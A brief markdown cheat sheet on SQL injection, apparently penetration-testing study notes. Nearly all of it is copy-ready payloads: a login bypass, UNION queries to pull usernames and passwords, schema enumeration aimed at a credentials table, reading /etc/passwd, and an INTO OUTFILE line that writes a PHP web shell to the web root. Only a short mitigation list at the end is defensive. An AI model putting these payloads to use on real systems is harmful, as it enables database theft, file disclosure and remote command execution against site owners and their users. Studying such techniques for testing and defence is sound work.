SQL Injection
---

## Basic Injection

`admin' or 1=1; --`

`admin' or 1=1; #`

## Union

Union combines results from multiple results, but they need to have the same number of columns and data types

We can detect the number of columns using `ORDER BY`. Keep increasing the number until you get an error `Unknown column <n> in 'order caluse'`

`' order by 1-- -`

Then we can use the correct number of columns in the attack

`SELECT * from products where product_id = '1' UNION SELECT 1, username, 3 from passwords`

## Database Enumeration

1. Get the list of databases
2. Get the list of tables
3. List the columns within the tables

`admin' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`

`admin' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

`admin' UNION select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

If you only have one column to work with, you can use `group_concat`

`admin' UNION select group_concat(COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA) from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

## Reading Files 

`admin' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

## Writing Files

`admin' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

`admin' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

## Mitigation

1. Santize your inputs
2. Validate your inputs
3. Set correct user privileges
4. WAF to filter bad requests
5. Parameterize queries
